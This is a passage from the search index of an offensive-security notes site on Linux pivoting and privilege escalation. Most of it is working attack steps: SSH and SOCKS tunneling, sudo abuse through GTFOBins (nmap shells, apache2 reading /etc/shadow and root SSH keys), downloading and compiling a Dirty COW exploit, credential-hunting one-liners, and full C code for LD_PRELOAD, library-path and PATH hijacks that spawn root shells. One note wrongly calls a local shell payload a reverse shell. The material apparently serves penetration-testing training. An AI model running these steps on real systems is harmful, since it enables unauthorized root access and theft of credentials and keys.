Forwarding","text":""},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/SSH-Port-Forwarding/#port-forwarding-with-ssh-and-socks-tunneling","title":"Port Forwarding with SSH and SOCKS Tunneling","text":""},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/SSH-Port-Forwarding/#executing-local-port-forward","title":"Executing Local Port Forward","text":"<ol> <li> <p>Forward local port 1234 to MySQL port 3306 on the Ubuntu server: <pre><code>ssh -L 1234:localhost:3306 ubuntu@[TARGET-IP]\n</code></pre></p> </li> <li> <p>Forward multiple ports: <pre><code>ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64\n</code></pre></p> </li> <li> <p>Confirm port forward with netstat: <pre><code>netstat -antp | grep 1234\n</code></pre></p> </li> <li> <p>Confirm port forward with Nmap: <pre><code>nmap -v -sV -p1234 localhost\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Pivoting-Tunneling-and-Port-Forwarding/Port-Forwarding/SSH-Port-Forwarding/#dynamic-port-forwarding-with-ssh-and-socks-tunneling","title":"Dynamic Port Forwarding with SSH and SOCKS Tunneling","text":"<ol> <li> <p>Start SSH client to enable dynamic port forwarding: <pre><code>ssh -D 9050 ubuntu@10.129.202.64\n</code></pre></p> </li> <li> <p>Modify <code>/etc/proxychains.conf</code> to include: <pre><code>socks4 127.0.0.1 9050\n</code></pre></p> </li> <li> <p>Use Nmap with Proxychains: <pre><code>proxychains nmap -v -sn 172.16.5.1-200\n</code></pre></p> </li> <li> <p>Enumerate Windows target through Proxychains: <pre><code>proxychains nmap -v -Pn -sT 172.16.5.19\n</code></pre></p> </li> <li> <p>Use xfreerdp with Proxychains: <pre><code>proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/","title":"Exploiting Sudo Privileges","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/#what-is-sudo","title":"What Is Sudo?","text":"<p>Sudo, which stands for \u201csuper user do\u201d, is a program (binary) that allows a user to run a program as another user (most often root),The primary purpose for sudo is to allow a user to run a program as root that they cannot otherwise run being a standard user. This creates a more \u201csecure\u201d landscape as the user does not need to login as root or su root to run a program as root, they can simply use sudo instead.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/#abusing-intended-functionality","title":"Abusing Intended Functionality","text":"<p>The sudoers file <code>/etc/sudoers</code> can be configured a number of ways, but for the most part it is pretty easy to understand. We will often see things like \u201cALL\u201d and \u201cNOPASSWD\u201d, and sometimes a username such as root or something else, like so:</p> <ol> <li>Any command can be run as any user/group. <code>(ALL : ALL) ALL</code></li> <li>Only the specified program can be run. <code>(ALL : ALL) /some/program</code></li> <li>No password required for specified commands. <code>(root) NOPASSWD: ALL</code></li> <li>A specific user can run a specific program. <code>(user) /some/program</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/#enumerate-sudo-privileges","title":"Enumerate Sudo Privileges","text":"<ol> <li> <p>List the programs that our current user can execute with Sudo privileges: <code>sudo -l</code> </p> <p></p> <p>NOTE: Here we can see that our current user hackfast has the ability to run quite a few programs with sudo, and for most of them, without the need to supply a password, because NOPASSWD has been set on some of the entries. 2.  Automating SUID/SGID Enumeration binaries with LinPEAS  </p> <p></p> <p>NOTE: This shows us that a lot of these binaries that we can run with sudo are red/yellow, which means there is a 95% chance that they will result in a root escalation.</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/#exploiting-sudo-commands-gtfobins","title":"Exploiting Sudo Commands \u2013 GTFOBins","text":"<p>To kickoff the exploitation examples, we are going to exploit four of the the red/yellow findings above using GTFOBins,For all of the exploits available on GTFOBins, there is one thing they all have in common \u2013 they assume execution as root, not every vulnerable entry in the sudoers file results in an immediate root shell. Instead, they may provide the ability to do things such as read or write a file as root.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/#exploiting-easy-shell-binaries-nmap","title":"Exploiting Easy Shell Binaries \u2013 Nmap","text":"<ol> <li> <p>we can see there are two different exploits on GTFOBins that look interesting.  </p> <p></p> <p>NOTE: The first one creates a script that executes /bin/sh and then executes the script with nmap.the second one utilizes an \u201cinteractive\u201d mode that can be broken out of as root. However, this exploit has a version requirement and only works on versions 2.02 \u2013 5.21.</p> </li> <li> <p>Since exploit B is \u201ceasier\u201d, we can check which version of nmap is running on the host. <code>/usr/bin/nmap --version</code> </p> <p></p> <p>NOTE: We can see the version is 5.00, which falls in the vulnerable range.</p> </li> <li> <p>Since the version is vulnerable to exploit (b), we can simply use the commands provided by GTFOBins and get a root shell. <code>sudo nmap --interactive</code>, <code>!sh</code> </p> <p></p> <p>NOTE: When using the exploits found on GTFOBins, always use the absolute path to the binary found in the sudo -l output.</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Exploiting-Sudo-Privileges/#apache2-file-read-vulnerability","title":"Apache2 \u2013 File Read Vulnerability","text":"<p>When it comes to file read exploits, there are a few key files we want to try and target.,Right out of the gate we can target the /etc/shadow file and then start cracking hashes; however, another good file we can look for is a root SSH key,While cracking hashes might get us the root password \u2013 an SSH key will get us instant access as root.</p> <ol> <li> <p>check how to read files with Apache2 from GTFOBins.  </p> <p></p> <p>NOTE: Here we can see that GTFOBins uses a variable to set the file to read, but we don\u2019t need to do all that,Instead, we can just run the second command and specify the file we want to read directly on the command line.</p> </li> <li> <p>For example, if we want to grab all the hashes from the shadow file, we can do that with the following: <code>sudo /usr/sbin/apache2 -f /etc/shadow | grep '$6'</code> </p> <p></p> <p>NOTE: To learn how to crack Shadow hashes using John the Ripper, check out cracking section</p> </li> <li> <p>Alternatively, we might get lucky and find an SSH key. <code>sudo /usr/sbin/apache2 -f /root/.ssh/id_rsa</code> NOTE: To learn how to crack Shadow hashes using John the Ripper, check out Cracking Section</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Kernel-Exploits/","title":"Kernel Exploits","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Kernel-Exploits/#introduction","title":"Introduction","text":"<p>A kernel is essentially a \u201ccomputer program\u201d that facilitates interactions between hardware and software. This means that the kernel sits between applications (software) and the CPU / memory / devices / etc. (hardware). The job that the kernel has is to convert input/ouput (I/O) requests from software into instruction sets that interact between the software and hardware.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Kernel-Exploits/#steps-to-identify-and-exploit-kernel-vulnerabilities","title":"Steps to Identify and Exploit Kernel Vulnerabilities","text":"<ol> <li> <p>Tools like Linux Exploit Suggester simplify finding potential exploits by scanning the system and suggesting possible exploits based on the kernel version and other details. <code>git clone https://github.com/mzet-/linux-exploit-suggester.git</code> </p> <p></p> </li> <li> <p>Host the Script Using Python: <code>python3 -m http.server 8000</code> </p> <p></p> </li> <li> <p>Transfer Script to target machine Using wget <code>wget http://[IP-ADRESS]:8000/linux-exploit-suggester.sh</code> </p> <p></p> </li> <li> <p>Make the script executable and run it on the target system: <code>chmod a+x linux-exploit-suggester.sh &amp;&amp; ./linux-exploit-suggester.sh</code> </p> <p></p> <p>The tool evaluates each exploit's potential effectiveness with different exposure levels: 1. highly probable: High likelihood of success without modifications. 2. probable: Likely to work with some adjustments. 3. less probable: Requires further manual analysis. 4. unprobable: Unlikely to be effective.  </p> <p></p> </li> <li> <p>Select a reliable version of the exploit. For example, you can use a well-reviewed variant of the Dirty COW exploit.\u00a0 <code>wget https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw -O dirtycow.c</code> </p> <p></p> </li> <li> <p>Host the Exploit Using Python: <code>python3 -m http.server 8000</code> </p> <p></p> </li> <li> <p>Use wget to download the exploit to the target machine: <code>wget http://[IP-ADRESS]:8000/dirtycow.c</code> </p> <p></p> </li> <li> <p>Compile the exploit code on the target system: <code>gcc -pthread dirtycow.c -o dirtycow</code></p> </li> <li> <p>Run the compiled exploit to perform the attack: <code>./dirtycow</code> </p> <p></p> <p>NOTE: After successful execution, elevate privileges to root using: <code>/usr/bin/passwd</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Passwords-%26-Keys/","title":"Passwords & Keys","text":"<ol> <li>search for files that contain the string \u201cpassw\u201d and \u201cpwd\u201d across the entire filesystem <pre><code>grep --color=auto -rnw '/' -iIe \"PASS\\|PASSW\\|PASSWD\\|PASSWORD\\|PWD\" --color=always 2&gt;/dev/null\n</code></pre></li> <li>navigate to common folders where we normally find interesting files, such as /var/www, /tmp, /opt, /home. <pre><code>grep --color=auto -rnw -iIe \"PASSW\\|PASSWD\\|PASSWORD\\|PWD\" --color=always 2&gt;/dev/null\n</code></pre></li> <li>search for configuration files      <pre><code>for l in $(echo \".conf .config .cnf\"); do echo -e \"\\nFile extension: $l\"; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\"; done\n</code></pre></li> <li>extract credentials from configuration files      <pre><code>for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\"); do echo -e \"\\nFile: $i\"; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\"; done\n</code></pre></li> <li>Searches for all files that end with _history <pre><code>find / -name *_history -xdev 2&gt; /dev/null \n</code></pre></li> <li>search for database files      <pre><code>for l in $(echo \".sql .db .*db .db*\"); do echo -e \"\\nDB File extension: $l\"; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\"; done\n</code></pre></li> <li>search for common file types used with scripts. <pre><code>for l in $(echo \".py .pyc .pl .go .jar .c .sh\"); do echo -e \"\\nFile extension: $l\"; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\"; done\n</code></pre></li> <li> <p>search for various document file types, excluding certain directories      <pre><code>for ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\"); do echo -e \"\\nFile extension: $ext\"; find / -name *$ext 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\"; done\n</code></pre></p> </li> <li> <p>search logs for sensitive data <pre><code>for i in $(ls /var/log/* 2&gt;/dev/null); do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]]; then echo -e \"\\n#### Log file: $i\"; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null; fi; done\n</code></pre></p> </li> <li> <p>credentials stored in memory <pre><code>strings /dev/mem -n10 | grep -ie \"PASSWORD\\|PASSWD\" --color=always\n</code></pre></p> </li> <li> <p>search for notes that may contain credentials. <pre><code>find /home/* \\( -type f -name \"*.txt\" -o -type f ! -name \"*.*\" \\)\n</code></pre></p> </li> <li> <p>search for the string \"password=\" in all files (case-insensitive) <pre><code>grep --color=auto -rnw '/' -ie \"PASSWORD=\" --color=always 2&gt;/dev/null\n</code></pre></p> </li> <li> <p>scripts often contain hardcoded credentials. <pre><code>for l in $(echo \".py .pyc .pl .go .jar .c .sh\"); do echo -e \"\\nFile extension: $l\"; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\"; done\n</code></pre></p> </li> <li> <p>Search the filesystem for files named authorized_keys: <pre><code>find / -name authorized_keys 2&gt; /dev/null\n</code></pre></p> </li> <li> <p>search the filesystem for key terms PRIVATE KEY to discover SSH keys <pre><code>grep -rnw \"PRIVATE KEY\" /* 2&gt;/dev/null | grep \":1\"\n</code></pre></p> </li> <li> <p>search for the keywords PRIVATE KEY within files contained in a user's home directory.      <pre><code>grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/","title":"Strategy","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#1-run-scripts-and-analyze-enumeration-results","title":"1. Run Scripts and Analyze Enumeration Results","text":"<ul> <li> <p> Run LinPEAS,LinEnum, lse.sh If scripts fail, refer to manual enumeration commands available in the System Enumeration section.</p> </li> <li> <p> Carefully review the output of your enumeration scripts and manual commands.</p> </li> <li> Focus on high-value targets such as outdated software, misconfigurations, sensitive files, and open ports.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#2-create-a-checklist","title":"2. Create a Checklist","text":"<ul> <li> Create a checklist of potential privilege escalation vectors based on your enumeration results.</li> <li> Avoid getting lost in rabbit holes by prioritizing tasks and focusing on the most promising leads.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#3-search-key-directories","title":"3. Search Key Directories","text":"<ul> <li> Search for files in your home directory and other common locations such as /var/backup, /tmp, /etc, and /opt.</li> <li> Check user\u2019s history files (~/.bash_history, ~/.zsh_history, ~/.mysql_history) for useful information like commands or passwords.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#4-try-simple-methods-first","title":"4. Try Simple Methods First","text":"<ul> <li> Focus on methods that require fewer steps:</li> <li> Sudo Privileges: Check if your user has any sudo privileges using sudo -l. Look for commands that can be executed without a password.</li> <li> Cron Jobs: Look for scheduled tasks that might be exploitable using crontab -l and inspecting /etc/crontab, /etc/cron.d, and /var/spool/cron.</li> <li> SUID Files: Identify and exploit SUID files for privilege escalation with find / -perm -4000 -type f 2&gt;/dev/null.</li> <li> World-Writable Files and Directories: Identify world-writable files and directories with find / -writable ! -path \"/proc/\" -type d 2&gt;/dev/null.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#5-investigate-root-processes","title":"5. Investigate Root Processes","text":"<ul> <li> Enumerate the versions of root processes and search for known exploits. Use ps aux | grep root to identify running root processes.</li> <li> Cross-reference identified software versions with public exploit databases like Exploit-DB</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#6-network-enumeration","title":"6. Network Enumeration","text":"<ul> <li> Identify network interfaces and IP addresses using ifconfig or ip a.</li> <li> Check active connections and listening ports with netstat -an -p TCP, netstat -ltp, or lsof -i.</li> <li> Check for internal ports that might be forwarded to your attacking machine for further exploitation.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#7-review-and-rethink","title":"7. Review and Rethink","text":"<ul> <li> If you still haven\u2019t achieved root access, re-read your enumeration dumps and highlight anything unusual.</li> <li> Look for unfamiliar process or file names, uncommon filesystem configurations, or odd usernames.</li> <li> As a last resort, consider kernel exploits if no other method works.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Strategy/#general-tips","title":"General Tips","text":"<ol> <li>Stay Calm and Focused: Privilege escalation is often a multi-step process that requires careful attention to detail.</li> <li>Be Patient: Results may not be immediate. Take your time to analyze and understand the environment.</li> <li>Keep Notes: Document your findings meticulously. A small piece of information might become crucial later.</li> <li>Use Multiple Tools: Different tools might reveal different information. Cross-reference findings from tools like winPEAS, Seatbelt, and manual commands.</li> <li>Focus on Quick Wins: Identify and exploit low-hanging fruits such as weak permissions, misconfigured services, and stored credentials.</li> <li>Be Ready to Adapt: If an initial approach fails, reassess the situation and be prepared to try alternative methods.</li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/System-Enumeration/","title":"System Enumeration","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/System-Enumeration/#system-enumeration","title":"System Enumeration","text":"<ol> <li>display the hostname of the system:     <code>hostname</code></li> <li>display detailed kernel information:     <code>uname -a</code></li> <li>display the distribution information:     <code>cat /etc/issue</code></li> <li>list all running processes:     <code>ps aux</code></li> <li>show disk usage in human-readable format:     <code>df -h</code></li> <li>display memory usage:     <code>free -m</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/System-Enumeration/#user-enumeration","title":"User Enumeration","text":"<ol> <li>display the current user:     <code>whoami</code></li> <li>display user identity:     <code>id</code></li> <li>view commands that can be run as sudo:     <code>sudo -l</code></li> <li>list all users:     <code>cat /etc/passwd</code></li> <li>extract usernames:     <code>cat /etc/passwd | cut -d : -f 1</code></li> <li>list user password hashes (requires root):     <code>cat /etc/shadow</code></li> <li>list all groups:     <code>cat /etc/group</code></li> <li>view command history:     <code>history</code></li> <li>check for nfs shares:     <code>cat /etc/exports</code></li> <li>list users in the sudo group:     <code>grep '^sudo:.*$' /etc/group</code></li> <li>display the version of sudo:     <code>sudo -V</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/System-Enumeration/#network-enumeration","title":"Network Enumeration","text":"<ol> <li>display all ip addresses:     <code>ip a s</code></li> <li>display routing table:     <code>ip route</code></li> <li>display arp table:     <code>ip neigh</code></li> <li>check open ports and associated services:     <code>netstat -ano</code></li> <li>display all network interfaces:     <code>ifconfig -a</code></li> <li>list all listening ports:     <code>ss -tuln</code></li> <li>display summary of active connections:     <code>ss -s</code></li> <li>display dns configuration:     <code>cat /etc/resolv.conf</code></li> <li>list all firewall rules:     <code>iptables -L</code></li> <li>display wireless network interfaces:     <code>iwconfig</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/System-Enumeration/#enumeration-techniques","title":"Enumeration Techniques","text":"<ol> <li>find files with the suid bit set:     <code>find / -perm -4000 2&gt;/dev/null</code></li> <li>find files with the sgid bit set:     <code>find / -perm -2000 2&gt;/dev/null</code></li> <li>find writable directories:     <code>find / -writable 2&gt;/dev/null</code></li> <li>find world writable files:     <code>find / -perm -o+w -type f 2&gt;/dev/null</code></li> <li>list open files and associated network connections:     <code>lsof -i</code></li> <li>identify potential kernel exploits:     <code>uname -r; searchsploit $(uname -r)</code></li> <li>display the status of all services:     <code>service --status-all</code></li> <li>list scheduled cron jobs:     <code>crontab -l; ls -la /etc/cron*</code></li> <li>list installed packages:     <code>dpkg -l | grep -i \"package_name\"</code></li> <li>extract and display firefox browser history:     <code>cat ~/.mozilla/firefox/*.default-release/places.sqlite</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/System-Enumeration/#automated-enumeration-tools","title":"Automated Enumeration Tools","text":"<ol> <li>LinPEAS </li> <li>LinEnum </li> <li>Linux Exploit Suggester </li> <li>Linux Smart Enumeration </li> <li>Linux Privilege Checker </li> <li>pspy </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/LD_LIBRARY_PATH/","title":"LD_LIBRARY_PATH","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/LD_LIBRARY_PATH/#steps-to-identify-and-exploit-ld_library_path","title":"Steps to Identify and Exploit LD_LIBRARY_PATH","text":"<ol> <li> <p>Verify which environment variables are being inherited <code>sudo -l</code> </p> <p></p> </li> <li> <p>Identify the shared libraries required by the target application (e.g., apache2): <code>ldd /usr/sbin/apache2</code> </p> <p></p> NOTE <p>the library libcrypt.so.1 is chosen due to its common use and effectiveness.</p> </li> <li> <p>Create\u00a0 <code>library_path.c</code>\u00a0C file that includes a constructor function to execute desired commands upon loading:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid inject()__attribute__((constructor));\n\nvoid inject() {\n    unsetenv(\"LD_PRELOAD\");\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}\n</code></pre> NOTE <p>The constructor attribute is a special function attribute in GCC. It instructs the compiler to automatically execute the annotated function before main() is called, allowing your commands to run as soon as the shared library is loaded..</p> </li> <li> <p>Compile the C file into a shared library with the same name as the target library: <code>gcc -o libcrypt.so.1 -shared -fPIC library_path.c</code></p> </li> <li> <p>Run the target application with sudo, setting LD_LIBRARY_PATH to include the directory containing the malicious library: <code>sudo LD_LIBRARY_PATH=. apache2</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/LD_PRELOAD/","title":"LD_PRELOAD","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/LD_PRELOAD/#steps-to-identify-and-exploit-ld_preload","title":"Steps to Identify and Exploit LD_PRELOAD","text":"<ol> <li> <p>To check if LD_PRELOAD is enabled, run sudo -l and look for env_keep+=LD_PRELOAD in the output. <code>sudo -l</code> </p> <p></p> NOTE: <p>When a program is running, LD_PRELOAD loads a shared object before any others. By writing a simple script with init() function, it will\u00a0 execute code as soon as the object is loaded.</p> </li> <li> <p>Craft a C file that will act as the malicious shared library. This library should include an initialization function (<code>_init</code>) to perform desired actions (e.g., opening a reverse shell, elevating privileges).</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0,0,0);\n    system(\"/bin/bash -p\");\n}\n</code></pre> <p></p> NOTE: <p>This example provides a reverse shell to the attacker's machine.</p> </li> <li> <p>Compile the Malicious Code <code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c</code> </p> <p></p> </li> <li> <p>Execute any binary you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object. <code>sudo LD_PRELOAD=/tmp/preload.so /usr/bin/man</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/readme/","title":"README","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/readme/#introduction","title":"Introduction","text":"<p>Environment variables are used to store configuration settings and system information, such as paths to executable files, user preferences, and system directories. Common examples include <code>PATH</code>, <code>HOME</code>, and <code>LD_LIBRARY_PATH</code>.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/readme/#manipulating-path","title":"Manipulating PATH","text":"Aspect Description Definition The PATH variable specifies the directories the shell searches for executable files. Attack Method By modifying PATH, an attacker can prioritize malicious binaries over legitimate ones. Example An attacker can create a malicious script named <code>ls</code> and place it in a directory they control. If they prepend this directory to the PATH, the system will execute their malicious script instead of the genuine <code>ls</code> command."},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/readme/#exploiting-ld_preload","title":"Exploiting LD_PRELOAD","text":"Aspect Description Definition LD_PRELOAD is used to load shared libraries before any others when a program is run. Attack Method An attacker can set LD_PRELOAD to a malicious library to execute arbitrary code with the privileges of the target program. Risk This is particularly dangerous for setuid binaries (programs that run with elevated privileges)."},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Environment-Variables/readme/#exploiting-ld_library_path","title":"Exploiting LD_LIBRARY_PATH","text":"Aspect Description Definition LD_LIBRARY_PATH specifies directories to search for shared libraries. Attack Method By adding a directory with malicious libraries to this variable, an attacker can manipulate which libraries are loaded, potentially executing malicious code. Risk This method can compromise the integrity and security of applications, especially those running with elevated privileges, leading to unauthorized actions and data breaches."},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/Enumerating-SUID-and-SGID-Files/","title":"Enumerating SUID and SGID","text":"<ol> <li> <p>To hunt for all SUID binaries on the system <code>find / -type f -perm -u=s 2&gt;/dev/null</code> </p> <p></p> </li> <li> <p>To search for SUID binaries owned by root and include the <code>-ls</code> flag to view file permissions <code>find / -type f -perm -4000 -user root -ls 2&gt;/dev/null</code> </p> <p> </p> <p>NOTE: Right away we can see there are a lot of SUID binaries; however, that does not mean they are all interesting to us.</p> </li> <li> <p>You can search for both SUID and SGID at the same time <code>find / \\( -perm -4000 -o -perm -2000 \\) -type f -exec ls -la {} \\; 2&gt; /dev/null</code> </p> <p></p> </li> <li> <p>Automating SUID/SGID Enumeration binaries with LinPEAS\u00a0 <code>./linpeas.sh</code> </p> <p></p> <p>NOTE: All red/yellow findings you may come across. Exploits for each can be found on GTFOBins.</p> </li> <li> <p>we can see that LinPEAS also found four other binaries that are interesting to us because they are \u201cunknown\u201d. This typically means these are custom SUID binaries, which deserve a closer inspection.  </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/Exploiting-PATH-Environment-Injection/","title":"Exploiting PATH Environment Injection","text":"<ol> <li> <p>the first thing we want to do when facing a binary we are not familiar with, is run it to see what it does. <code>/usr/local/bin/suid-env</code> </p> <p></p> <p>NOTE: here we can see that the binary appears to be start the apache2 service.</p> </li> <li> <p>the next thing we want to do is to try and extract strings from the binary. This well help us determine if any interesting binaries are being loaded during execution. <code>strings /usr/local/bin/suid-env</code> </p> <p></p> <p>NOTE: In the strings we can see that the command service apache2 start in the binary is used without an absolute path</p> </li> <li> <p>Now that we have found this vulnerability, we need to edit our PATH variable to include a writeable directory. <code>echo $PATH</code> </p> <p></p> <p>NOTE: When the command service apache2 start is executed by the suid-path binary, it is done so without using the absolute path. This means that the system will check each of the directories listed in our PATH environmental variable from left to right for the service binary, and then execute it from the first directory where it is found.</p> </li> <li> <p>All of the default directories in the PATH are NOT writeable for standard users. That means we will just have to add a new one. <code>export PATH=/tmp:$PATH</code> </p> <p></p> <p>NOTE: Any user has the ability to edit their own PATH; and, any new directory added to a users PATH gets placed on the leftmost side,This means that any command that is executed without the absolute path to the binary, will check /tmp first.</p> </li> <li> <p>Now all we need to do is Create a malicious binary named service and place it in the /tmp folder. <code>echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' &gt; /tmp/service.c</code></p> </li> <li> <p>Our malicious C program looks good. Now all we need to do is compile it <code>gcc /tmp/service.c -o /tmp/service</code></p> </li> <li> <p>Our exploit is all ready. Now when we execute suid-path, the program will ride the PATH to find the service command, and execute our malicious version of service before it ever finds the real binary. <code>/usr/local/bin/suid-env</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/Exploiting-Shared-Object-Injection/","title":"Exploiting Shared Object Injection","text":"<ol> <li> <p>Since we are not familiar with this binary, the very first thing we should do is interact with it to see what it does. <code>/usr/local/bin/suid-so</code> </p> <p></p> </li> <li> <p>we can use the strings command to see if there are any binaries or shared libraries being loaded during execution. <code>strings /usr/local/bin/suid-so</code></p> <p> </p> </li> <li> <p>let\u2019s take a closer look at what the binary is doing at runtime by debugging it,we are most interested in seeing what gets loaded when the program runs, which is why we will use strace for our debugging. <code>strace /path/to/suid-binary 2&gt;&amp;1 | grep -iE \"open|access|no such file\"</code> </p> <p></p> <p>NOTE: most important is finding a shared object that executes from a directory where we have write permissions.</p> </li> <li> <p>it appears that a shared object is loaded during execution from user home directory we have write permissions to home directory, we should be able to replace libcalc.so with something malicious. <code>ls -la /home/user/.config/</code> </p> <p></p> </li> <li> <p>Similar to when we used the strings command, we have discovered the libcalc.so file that executes from user home directory, This also confirms that the shared object is being loaded during execution, which means it is exploitable.</p> </li> <li> <p>we will create a malicious C program and then compile it into a shared object file.</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    setuid(0);\n    system(\"/bin/bash -p\");\n}\n</code></pre> </li> <li> <p>we need to compile the C program into a shared object file and place it in the expected path of the missing library <code>gcc -shared -fPIC -o /expected/path/malicious.so /path/to/malicious.c</code> </p> <p></p> </li> <li> <p>All we need to do now is run the suid-so binary. Once executed, it will load the lcalc shared library. When it does, it will execute our malicious version of libcalc.so and drop us directly into a root shell. <code>/path/to/suid-binary</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/Exploiting-Vulnerable-SUID-Binaries/","title":"Exploiting Vulnerable SUID","text":"<ol> <li> <p>Let\u2019s have a look at the exim binary that we found during our enumeration,when facing a binary we are not familiar with, we run it to see what it does. <code>/usr/sbin/exim-4.84-3 --help</code> </p> <p></p> </li> <li> <p>Here we can see the binary does have sort of help menu, which means it is not a simple \u201cin-house\u201d custom binary. This tells us that Exim is a Mail Transfer Agent,This is interesting and may be listed on GTFOBins, so this one we will check. <code>https://gtfobins.github.io/</code> </p> <p></p> <p>NOTE: We did not find the Exim binary listed on GTFOBins.</p> </li> <li> <p>We need to determine the version of the binary to search for any public exploits available <code>/usr/sbin/exim-4.84-3 --version</code> </p> <p></p> </li> <li> <p>We were able to extract the version of exim 4.84 Now, we can search on searchsploit to see if there are any public exploits available for this version. <code>searchsploit exim 4.84</code> </p> <p></p> </li> <li> <p>Let's Download the exploit, then transfer it to the target system to gain elevated privileges. <code>searchsploit -m linux/local/39535.sh</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/readme/","title":"README","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/readme/#introduction-to-suid-and-sgid-files","title":"Introduction to SUID and SGID Files","text":"<p>SUID (Set Owner User ID up on execution) and SGID (Set Group ID up on execution) are special permissions set on executable files. These permissions allow the files to be executed with the privileges of the file owner or group respectively, rather than the privileges of the user running the file. It's essential to note that using <code>LD_PRELOAD</code> and <code>LD_LIBRARY_PATH</code> for hijacking library loads does not work with SUID executables as these environment variables are ignored to prevent security 